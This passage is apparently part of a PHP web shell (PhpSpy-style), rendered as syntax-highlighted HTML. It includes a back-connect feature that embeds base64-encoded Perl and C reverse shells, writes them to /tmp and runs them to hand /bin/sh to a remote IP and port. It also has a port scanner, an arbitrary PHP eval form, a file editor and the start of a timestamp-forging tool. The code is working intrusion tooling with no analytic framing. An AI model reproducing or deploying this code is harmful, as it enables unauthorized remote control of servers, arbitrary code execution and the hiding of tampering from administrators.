<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'backconnect'</span>) {
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">yourip</span> &amp;&amp; $<span style="color: #eab700;">yourip</span> = $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'REMOTE_ADDR'</span>];
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">yourport</span> &amp;&amp; $<span style="color: #eab700;">yourport</span> = <span style="color: #3e999f;">'12345'</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">usedb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'perl'</span>=&gt;<span style="color: #3e999f;">'perl'</span>,<span style="color: #3e999f;">'c'</span>=&gt;<span style="color: #3e999f;">'c'</span>);

<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">back_connect</span>=<span style="color: #3e999f;">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ</span><span style="color: #3e999f; text-decoration: underline;">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9</span><span style="color: #3e999f; text-decoration: underline;">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3</span><span style="color: #3e999f; text-decoration: underline;">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT</span><span style="color: #3e999f; text-decoration: underline;">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y</span><span style="color: #3e999f; text-decoration: underline;">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ</span><span style="color: #3e999f; text-decoration: underline;">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">back_connect_c</span>=<span style="color: #3e999f;">"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0</span><span style="color: #3e999f; text-decoration: underline;">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb</span><span style="color: #3e999f; text-decoration: underline;">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog</span><span style="color: #3e999f; text-decoration: underline;">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp</span><span style="color: #3e999f; text-decoration: underline;">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV</span><span style="color: #3e999f; text-decoration: underline;">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M</span><span style="color: #3e999f; text-decoration: underline;">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z</span><span style="color: #3e999f; text-decoration: underline;">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #3e999f;">"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB</span><span style="color: #3e999f; text-decoration: underline;">jbG9zZShmZCk7IA0KfQ=="</span><span style="text-decoration: underline;">;</span>

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">start</span> &amp;&amp; $<span style="color: #eab700;">yourip</span> &amp;&amp; $<span style="color: #eab700;">yourport</span> &amp;&amp; $<span style="color: #eab700;">use</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">use</span> == <span style="color: #3e999f;">'perl'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">cf(</span><span style="color: #3e999f;">'/tmp/angel_bc'</span>,$<span style="color: #eab700;">back_connect</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = <span style="color: #4d4d4c; background-color: #ffffff;">execute(which(</span><span style="color: #3e999f;">'perl'</span>).<span style="color: #3e999f;">" /tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">cf(</span><span style="color: #3e999f;">'/tmp/angel_bc.c'</span>,$<span style="color: #eab700;">back_connect_c</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = <span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">'gcc -o /tmp/angel_bc /tmp/angel_bc.c'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">unlink(</span><span style="color: #3e999f;">'/tmp/angel_bc.c'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = <span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">"/tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">"Now script try connect to $yourip port $yourport ..."</span>);
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Back Connect'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'backconnect'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'Your IP:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'yourip'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">20</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">yourip</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'Your Port:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'yourport'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">15</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">yourport</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'Use:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeselect(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'use'</span>,<span style="color: #3e999f;">'option'</span>=&gt;$<span style="color: #eab700;">usedb</span>,<span style="color: #3e999f;">'selected'</span>=&gt;$<span style="color: #eab700;">use</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'start'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #3e999f;">'Start'</span>,<span style="color: #3e999f;">'type'</span>=&gt;<span style="color: #3e999f;">'submit'</span>,<span style="color: #3e999f;">'class'</span>=&gt;<span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end</span>

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'portscan'</span>) {
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">scanip</span> &amp;&amp; $<span style="color: #eab700;">scanip</span> = <span style="color: #3e999f;">'127.0.0.1'</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">scanport</span> &amp;&amp; $<span style="color: #eab700;">scanport</span> = <span style="color: #3e999f;">'21,25,80,110,135,139,445,1433,3306,3389,5631,4395</span><span style="color: #3e999f; text-decoration: underline;">8'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Port Scan'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'portscan'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'IP:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'scanip'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">20</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">scanip</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'Port:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'scanport'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">80</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">scanport</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'startscan'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #3e999f;">'Scan'</span>,<span style="color: #3e999f;">'type'</span>=&gt;<span style="color: #3e999f;">'submit'</span>,<span style="color: #3e999f;">'class'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #3e999f; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">startscan</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>(<span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">','</span>, $<span style="color: #eab700;">scanport</span>) <span style="color: #718c00;">as</span> $<span style="color: #eab700;">port</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fp</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">fsockopen(</span>$<span style="color: #eab700;">scanip</span>, $<span style="color: #eab700;">port</span>, &amp;$<span style="color: #eab700;">errno</span>, &amp;$<span style="color: #eab700;">errstr</span>, <span style="color: #4d4d4c; background-color: #ffffff;">1</span>);<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">fp</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;li&gt;'</span>.$<span style="color: #eab700;">scanip</span>.<span style="color: #3e999f;">':'</span>.$<span style="color: #eab700;">port</span>.<span style="color: #3e999f;">' ------------------------ &lt;span styl</span><span style="color: #3e999f; text-decoration: underline;">e="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>  } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;li&gt;'</span>.$<span style="color: #eab700;">scanip</span>.<span style="color: #3e999f;">':'</span>.$<span style="color: #eab700;">port</span>.<span style="color: #3e999f;">' ------------------------ &lt;span styl</span><span style="color: #3e999f; text-decoration: underline;">e="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>  }<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/ul&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'eval'</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">phpcode</span> = <span style="color: #4d4d4c; background-color: #ffffff;">trim(</span>$<span style="color: #eab700;">phpcode</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">phpcode</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #4d4d4c; background-color: #ffffff;">preg_match(</span><span style="color: #3e999f;">'#&lt;\?#si'</span>, $<span style="color: #eab700;">phpcode</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">phpcode</span> = <span style="color: #3e999f;">"&lt;?php\n\n{$phpcode}\n\n?&gt;"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">eval(</span><span style="color: #3e999f;">"?"</span>.<span style="color: #3e999f;">"&gt;$phpcode&lt;?"</span>);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=<span style="color: #4271ae;">&gt;</span><span style="color: #3e999f;">'Eval PHP Code'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'eval'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">maketext(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'PHP Code'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'phpcode'</span>, <span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">phpcode</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;&lt;a href="http://w'</span>.<span style="color: #3e999f;">'ww.4ng'</span>.<span style="color: #3e999f;">'el.net/php'</span>.<span style="color: #3e999f;">'spy/pl'</span>.<span style="color: #3e999f;">'ugin/" target="_bla</span><span style="color: #3e999f; text-decoration: underline;">nk"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfooter(</span>);
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end eval</span>

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'editfile'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">opfile</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fp</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">opfile</span>,<span style="color: #3e999f;">'r'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">contents</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fread(</span>$<span style="color: #eab700;">fp</span>, <span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">opfile</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">contents</span>=<span style="color: #4d4d4c; background-color: #ffffff;">htmlspecialchars(</span>$<span style="color: #eab700;">contents</span>);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Create / Edit File'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'file'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Current File (import new file name and new file)'</span>,<span style="color: #3e999f; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #3e999f; text-decoration: underline;">'editfilename'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #eab700; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">maketext(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'File Content'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'filecontent'</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">conte</span><span style="color: #eab700; text-decoration: underline;">nts</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfooter(</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">goback(</span>);

}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end editfile</span>

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'newtime'</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">opfilemtime</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">filemtime(</span>$<span style="color: #eab700;">opfile</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">$time = strtotime("$year-$month-$day $hour:$minute:$second");</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">cachemonth</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'January'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">1</span>,<span style="color: #3e999f;">'February'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">2</span>,<span style="color: #3e999f;">'March'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">3</span>,<span style="color: #3e999f;">'April'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">4</span>,<span style="color: #3e999f;">'May'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">5</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'June'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">6</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'July'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">7</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'August'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">8</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'September'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">9</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'October'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">10</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'November'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">11</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'December'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">12</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Clone folder/file was last modified time'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'file'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);
